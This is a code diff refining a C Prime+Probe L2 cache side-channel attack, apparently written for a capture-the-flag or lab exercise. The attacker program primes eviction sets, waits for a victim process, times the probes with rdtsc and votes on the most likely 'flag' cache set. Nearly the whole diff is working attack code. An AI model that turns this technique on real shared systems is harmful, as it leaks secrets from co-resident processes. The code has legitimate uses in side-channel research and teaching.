@@ -11,7 +11,8 @@
 #define LINE_SIZE 64
 #define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)
 
-#define REPEATS 3000
+#define REPEATS 2000        // slightly smaller, more stable
+#define WAIT_CYCLES 4000   // let victim run
 
 volatile uint8_t *buf;
 volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
@@ -39,8 +40,6 @@ void shuffle(int *arr) {
 }
 
 int main() {
-    /* works around 2/3 of time on victim-4. Randomize access, reverse probe, no usleep
-    */
     printf("Attacker ready. Prime+Probe starting...\n");
 
     buf = mmap(NULL,
@@ -57,6 +56,7 @@ int main() {
 
     *((char*)buf) = 1;
 
+    // build eviction sets
     for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
         for(int w = 0; w < WAYS; w++) {
             eviction_sets[set][w] = buf + set*LINE_SIZE + w*STRIDE;
@@ -71,81 +71,73 @@ int main() {
     int rounds = 0;
 
     while(1) {
-
         uint64_t scores[NUM_L2_CACHE_SETS] = {0};
-
-        
         int perm[NUM_L2_CACHE_SETS];
-        for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
-                perm[i] = i;
-        }
+
+        for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
+            perm[i] = i;
 
         shuffle(perm);
 
         for(int r = 0; r < REPEATS; r++) {
 
-        /* PRIME all sets */
-        for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
-            int set = perm[i];
+            // PRIME all sets with rotated ways
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+                int set = perm[i];
+                for(int w = 0; w < WAYS; w++) {
+                    int idx = (w + r) % WAYS;  // rotate ways for noise reduction
+                    tmp ^= *eviction_sets[set][idx]; // *** fixed
+                }
+            }
 
-            for(int w = 0; w < WAYS; w++) {
+            wait_cycles(WAIT_CYCLES);
 
-                int idx = (w + r) % WAYS;
-                tmp ^= *eviction_sets[set][w];
+            // PROBE all sets
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+                int set = perm[i];
+                uint64_t start = rdtsc();
+                for(int w = WAYS-1; w >= 0; w--) {
+                    tmp ^= *eviction_sets[set][w];
+                }
+                uint64_t end = rdtsc();
+                scores[set] += (end - start);
             }
         }
 
-        /* let victim run */
-        wait_cycles(4000);
-
-        /* PROBE all sets */
-        for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
-            int set = perm[i];
-
-            uint64_t start = rdtsc();
-
-            for(int w = WAYS-1; w >= 0; w--) {
-                tmp ^= *eviction_sets[set][w];
-            }
-
-            uint64_t end = rdtsc();
-
-            scores[set] += (end - start);
-            }
-        }
-
+        // find set with highest average latency
         int best_set = 0;
         uint64_t best_latency = 0;
-
         for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-
             uint64_t avg = scores[set] / REPEATS;
-
             if(avg > best_latency) {
                 best_latency = avg;
                 best_set = set;
             }
         }
 
+        // update votes and round count
         votes[best_set]++;
         rounds++;
 
-        if(rounds % 5 == 0){
+        // sliding window to reduce noise
+        if(rounds % 50 == 0) {
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
+                votes[i] = votes[i] / 2;  // decay old votes
+        }
 
+        // print likely flag every 5 rounds
+        if(rounds % 5 == 0) {
             int best_vote_set = 0;
             int best_votes = 0;
-
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
-                if(votes[i] > best_votes){
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+                if(votes[i] > best_votes) {
                     best_votes = votes[i];
                     best_vote_set = i;
                 }
             }
             printf("Likely flag: %d (votes=%d)\n", best_vote_set, best_votes);
-            }
         }
-
-        
+    }
 
     return 0;
 }
